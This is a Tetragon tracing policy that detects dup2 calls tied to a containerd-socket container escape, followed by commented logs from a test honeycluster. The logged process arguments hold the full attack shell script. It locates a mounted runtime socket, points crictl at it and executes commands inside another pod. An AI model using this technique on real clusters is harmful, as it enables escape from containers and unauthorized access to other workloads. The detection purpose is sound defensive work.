apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-containerd-sock-exploit-dup2
spec:
  kprobes:
  - call: "sys_dup2"
    syscall: true
    args:
    - index: 0
      type: "int"  # Old file descriptor
    - index: 1
      type: "int"  
    selectors:
    - matchArgs:
      - index: 1                    
        operator: "Equal"
        values: 
        - "0"
        - "1" 
        - "2"
      matchNamespaces:
        - namespace: "Pid"
          operator: "NotIn"
          values:
          - "host_ns"

#known noise:
#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1Mzk2Nzk0MzoxMjU1NTc=", "pid":125557, "uid":0, "cwd":"/", "binary":"/bin/sh", "arguments":"-c \"MOUNTED_SOCK_PATH=$(find /host/run -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock 2>/dev/null | head -n 1)\nif [[ -z \"$MOUNTED_SOCK_PATH\" ]]; then\n echo \"No relevant sockets found. Exiting.\"\n exit 1\nfi\ncat <<EOF > /tmp/crictl.yaml\nruntime-endpoint: unix://$MOUNTED_SOCK_PATH\nimage-endpoint: unix://$MOUNTED_SOCK_PATH\ndebug: false\nEOF\ncc=\"/usr/local/bin/crictl --config /tmp/crictl.yaml\"\necho \"Listing all pods:\"\n$cc ps -a\nTARGET_POD_ID=$($cc ps -a | awk 'NR==2{print $1}')\n$cc exec -s $TARGET_POD_ID -- /bin/sh -c \"echo 'Hello from the target pod!'\"\nsleep infinity \n\"", "flags":"execve inInitTree", "start_time":"2025-01-07T12:43:42.411966689Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://1e23ffff144e1ed2c80838955cb885f74d239eb59a4ffec9fea07a56211ac736", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:43:42Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"1e23ffff144e1ed2c80838955cb885f", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1MzAyMTk3MjoxMjU1NDI=", "refcnt":3, "tid":125557, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1MzAyMTk3MjoxMjU1NDI=", "pid":125542, "uid":0, "cwd":"/", "binary":"/bin/sh", "arguments":"-c \"MOUNTED_SOCK_PATH=$(find /host/run -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock 2>/dev/null | head -n 1)\nif [[ -z \"$MOUNTED_SOCK_PATH\" ]]; then\n echo \"No relevant sockets found. Exiting.\"\n exit 1\nfi\ncat <<EOF > /tmp/crictl.yaml\nruntime-endpoint: unix://$MOUNTED_SOCK_PATH\nimage-endpoint: unix://$MOUNTED_SOCK_PATH\ndebug: false\nEOF\ncc=\"/usr/local/bin/crictl --config /tmp/crictl.yaml\"\necho \"Listing all pods:\"\n$cc ps -a\nTARGET_POD_ID=$($cc ps -a | awk 'NR==2{print $1}')\n$cc exec -s $TARGET_POD_ID -- /bin/sh -c \"echo 'Hello from the target pod!'\"\nsleep infinity \n\"", "flags":"execve rootcwd clone inInitTree", "start_time":"2025-01-07T12:43:42.411021405Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://1e23ffff144e1ed2c80838955cb885f74d239eb59a4ffec9fea07a56211ac736", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:43:42Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"1e23ffff144e1ed2c80838955cb885f", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzA5NzIxMzAyMDoxMjU0ODg=", "tid":125542, "in_init_tree":true}, "function_name":"__x64_sys_dup2", "args":[{"int_arg":4}, {"int_arg":1}], "action":"KPROBE_ACTION_POST", "policy_name":"detect-containerd-sock-exploit-dup2", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-07T12:43:42.412412168Z"}
#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1NDYyMjYxMjoxMjU1NTk=", "pid":125559, "uid":0, "cwd":"/", "binary":"/bin/sh", "arguments":"-c \"MOUNTED_SOCK_PATH=$(find /host/run -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock 2>/dev/null | head -n 1)\nif [[ -z \"$MOUNTED_SOCK_PATH\" ]]; then\n echo \"No relevant sockets found. Exiting.\"\n exit 1\nfi\ncat <<EOF > /tmp/crictl.yaml\nruntime-endpoint: unix://$MOUNTED_SOCK_PATH\nimage-endpoint: unix://$MOUNTED_SOCK_PATH\ndebug: false\nEOF\ncc=\"/usr/local/bin/crictl --config /tmp/crictl.yaml\"\necho \"Listing all pods:\"\n$cc ps -a\nTARGET_POD_ID=$($cc ps -a | awk 'NR==2{print $1}')\n$cc exec -s $TARGET_POD_ID -- /bin/sh -c \"echo 'Hello from the target pod!'\"\nsleep infinity \n\"", "flags":"execve inInitTree", "start_time":"2025-01-07T12:43:42.412621911Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://1e23ffff144e1ed2c80838955cb885f74d239eb59a4ffec9fea07a56211ac736", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:43:42Z", "pid":10}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"1e23ffff144e1ed2c80838955cb885f", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1Mzk2Nzk0MzoxMjU1NTc=", "refcnt":1, "tid":125559, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1Mzk2Nzk0MzoxMjU1NTc=", "pid":125557, "uid":0, "cwd":"/", "binary":"/bin/sh", "arguments":"-c \"MOUNTED_SOCK_PATH=$(find /host/run -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock 2>/dev/null | head -n 1)\nif [[ -z \"$MOUNTED_SOCK_PATH\" ]]; then\n echo \"No relevant sockets found. Exiting.\"\n exit 1\nfi\ncat <<EOF > /tmp/crictl.yaml\nruntime-endpoint: unix://$MOUNTED_SOCK_PATH\nimage-endpoint: unix://$MOUNTED_SOCK_PATH\ndebug: false\nEOF\ncc=\"/usr/local/bin/crictl --config /tmp/crictl.yaml\"\necho \"Listing all pods:\"\n$cc ps -a\nTARGET_POD_ID=$($cc ps -a | awk 'NR==2{print $1}')\n$cc exec -s $TARGET_POD_ID -- /bin/sh -c \"echo 'Hello from the target pod!'\"\nsleep infinity \n\"", "flags":"execve inInitTree", "start_time":"2025-01-07T12:43:42.411966689Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://1e23ffff144e1ed2c80838955cb885f74d239eb59a4ffec9fea07a56211ac736", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:43:42Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"1e23ffff144e1ed2c80838955cb885f", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1MzAyMTk3MjoxMjU1NDI=", "refcnt":1, "tid":125557, "in_init_tree":true}, "function_name":"__x64_sys_dup2", "args":[{"int_arg":4}, {"int_arg":1}], "action":"KPROBE_ACTION_POST", "policy_name":"detect-containerd-sock-exploit-dup2", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-07T12:43:42.412760249Z"}
#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1NDc4NzkxNToxMjU1NjA=", "pid":125560, "uid":0, "cwd":"/", "binary":"/bin/sh", "arguments":"-c \"MOUNTED_SOCK_PATH=$(find /host/run -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock 2>/dev/null | head -n 1)\nif [[ -z \"$MOUNTED_SOCK_PATH\" ]]; then\n echo \"No relevant sockets found. Exiting.\"\n exit 1\nfi\ncat <<EOF > /tmp/crictl.yaml\nruntime-endpoint: unix://$MOUNTED_SOCK_PATH\nimage-endpoint: unix://$MOUNTED_SOCK_PATH\ndebug: false\nEOF\ncc=\"/usr/local/bin/crictl --config /tmp/crictl.yaml\"\necho \"Listing all pods:\"\n$cc ps -a\nTARGET_POD_ID=$($cc ps -a | awk 'NR==2{print $1}')\n$cc exec -s $TARGET_POD_ID -- /bin/sh -c \"echo 'Hello from the target pod!'\"\nsleep infinity \n\"", "flags":"execve inInitTree", "start_time":"2025-01-07T12:43:42.412786633Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://1e23ffff144e1ed2c80838955cb885f74d239eb59a4ffec9fea07a56211ac736", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:43:42Z", "pid":10}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"1e23ffff144e1ed2c80838955cb885f", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1Mzk2Nzk0MzoxMjU1NTc=", "refcnt":1, "tid":125560, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1Mzk2Nzk0MzoxMjU1NTc=", "pid":125557, "uid":0, "cwd":"/", "binary":"/bin/sh", "arguments":"-c \"MOUNTED_SOCK_PATH=$(find /host/run -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock 2>/dev/null | head -n 1)\nif [[ -z \"$MOUNTED_SOCK_PATH\" ]]; then\n echo \"No relevant sockets found. Exiting.\"\n exit 1\nfi\ncat <<EOF > /tmp/crictl.yaml\nruntime-endpoint: unix://$MOUNTED_SOCK_PATH\nimage-endpoint: unix://$MOUNTED_SOCK_PATH\ndebug: false\nEOF\ncc=\"/usr/local/bin/crictl --config /tmp/crictl.yaml\"\necho \"Listing all pods:\"\n$cc ps -a\nTARGET_POD_ID=$($cc ps -a | awk 'NR==2{print $1}')\n$cc exec -s $TARGET_POD_ID -- /bin/sh -c \"echo 'Hello from the target pod!'\"\nsleep infinity \n\"", "flags":"execve inInitTree", "start_time":"2025-01-07T12:43:42.411966689Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://1e23ffff144e1ed2c80838955cb885f74d239eb59a4ffec9fea07a56211ac736", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:43:42Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"1e23ffff144e1ed2c80838955cb885f", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1MzAyMTk3MjoxMjU1NDI=", "refcnt":1, "tid":125557, "in_init_tree":true}, "function_name":"__x64_sys_dup2", "args":[{"int_arg":3}, {"int_arg":0}], "action":"KPROBE_ACTION_POST", "policy_name":"detect-containerd-sock-exploit-dup2", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-07T12:43:42.412965575Z"}
#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1NDYyMjYxMjoxMjU1NTk=", "pid":125559, "uid":0, "cwd":"/", "binary":"/bin/sh", "arguments":"-c \"MOUNTED_SOCK_PATH=$(find /host/run -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock 2>/dev/null | head -n 1)\nif [[ -z \"$MOUNTED_SOCK_PATH\" ]]; then\n echo \"No relevant sockets found. Exiting.\"\n exit 1\nfi\ncat <<EOF > /tmp/crictl.yaml\nruntime-endpoint: unix://$MOUNTED_SOCK_PATH\nimage-endpoint: unix://$MOUNTED_SOCK_PATH\ndebug: false\nEOF\ncc=\"/usr/local/bin/crictl --config /tmp/crictl.yaml\"\necho \"Listing all pods:\"\n$cc ps -a\nTARGET_POD_ID=$($cc ps -a | awk 'NR==2{print $1}')\n$cc exec -s $TARGET_POD_ID -- /bin/sh -c \"echo 'Hello from the target pod!'\"\nsleep infinity \n\"", "flags":"execve inInitTree", "start_time":"2025-01-07T12:43:42.412621911Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://1e23ffff144e1ed2c80838955cb885f74d239eb59a4ffec9fea07a56211ac736", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:43:42Z", "pid":10}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"1e23ffff144e1ed2c80838955cb885f", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1Mzk2Nzk0MzoxMjU1NTc=", "refcnt":1, "tid":125559, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1Mzk2Nzk0MzoxMjU1NTc=", "pid":125557, "uid":0, "cwd":"/", "binary":"/bin/sh", "arguments":"-c \"MOUNTED_SOCK_PATH=$(find /host/run -name dockershim.sock -o -name containerd.sock -o -name crio.sock -o -name cri-dockerd.sock 2>/dev/null | head -n 1)\nif [[ -z \"$MOUNTED_SOCK_PATH\" ]]; then\n echo \"No relevant sockets found. Exiting.\"\n exit 1\nfi\ncat <<EOF > /tmp/crictl.yaml\nruntime-endpoint: unix://$MOUNTED_SOCK_PATH\nimage-endpoint: unix://$MOUNTED_SOCK_PATH\ndebug: false\nEOF\ncc=\"/usr/local/bin/crictl --config /tmp/crictl.yaml\"\necho \"Listing all pods:\"\n$cc ps -a\nTARGET_POD_ID=$($cc ps -a | awk 'NR==2{print $1}')\n$cc exec -s $TARGET_POD_ID -- /bin/sh -c \"echo 'Hello from the target pod!'\"\nsleep infinity \n\"", "flags":"execve inInitTree", "start_time":"2025-01-07T12:43:42.411966689Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://1e23ffff144e1ed2c80838955cb885f74d239eb59a4ffec9fea07a56211ac736", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:43:42Z", "pid":1}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"1e23ffff144e1ed2c80838955cb885f", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODIwMzM1MzAyMTk3MjoxMjU1NDI=", "refcnt":1, "tid":125557, "in_init_tree":true}, "function_name":"__x64_sys_dup2", "args":[{"int_arg":3}, {"int_arg":2}], "action":"KPROBE_ACTION_POST", "policy_name":"detect-containerd-sock-exploit-dup2", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-07T12:43:42.412923131Z"}
#{"process_kprobe":{"process":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODk2NzQ2MzU3MDI5OToxMzY1NjA=", "pid":136560, "uid":0, "cwd":"/run/containerd/io.containerd.runtime.v2.task/k8s.io/5e11723262f498fd4dbb793bdac2df686a4774e0f2e1906de6794e0536d69710/rootfs", "binary":"/kind/bin/mount-product-files.sh", "arguments":"/kind/bin/mount-product-files.sh", "flags":"execve inInitTree", "start_time":"2025-01-07T12:56:26.525660595Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://5e11723262f498fd4dbb793bdac2df686a4774e0f2e1906de6794e0536d69710", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:56:26Z", "pid":7}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"5e11723262f498fd4dbb793bdac2df6", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODk2NzQ2MTk4NTA4MjoxMzY1NTk=", "refcnt":1, "tid":136560, "in_init_tree":true}, "parent":{"exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODk2NzQ2MTk4NTA4MjoxMzY1NTk=", "pid":136559, "uid":0, "cwd":"/run/containerd/io.containerd.runtime.v2.task/k8s.io/5e11723262f498fd4dbb793bdac2df686a4774e0f2e1906de6794e0536d69710/rootfs", "binary":"/kind/bin/mount-product-files.sh", "arguments":"/kind/bin/mount-product-files.sh", "flags":"execve clone inInitTree", "start_time":"2025-01-07T12:56:26.524075472Z", "auid":4294967295, "pod":{"namespace":"default", "name":"kh-exploit-containerd-sock", "container":{"id":"containerd://5e11723262f498fd4dbb793bdac2df686a4774e0f2e1906de6794e0536d69710", "name":"attacker-container", "image":{"id":"docker.io/entlein/exploit-containerd-sock@sha256:8571374aab5e80ba9f55fdca946157296d36ce31c7d396319a6d06e0ad9e1f57", "name":"docker.io/entlein/exploit-containerd-sock:0.0.1"}, "start_time":"2025-01-07T12:56:26Z", "pid":7}, "pod_labels":{"app":"kubehound-edge-test"}, "workload":"kh-exploit-containerd-sock", "workload_kind":"Pod"}, "docker":"5e11723262f498fd4dbb793bdac2df6", "parent_exec_id":"aG9uZXljbHVzdGVyLWNvbnRyb2wtcGxhbmU6ODk2NzQzNzc3NjQ0NjoxMzY1NTM=", "tid":136559, "in_init_tree":true}, "function_name":"__x64_sys_dup2", "args":[{"int_arg":7}, {"int_arg":1}], "action":"KPROBE_ACTION_POST", "policy_name":"detect-containerd-sock-exploit-dup2", "return_action":"KPROBE_ACTION_POST"}, "node_name":"honeycluster-control-plane", "time":"2025-01-07T12:56:26.525906163Z"}

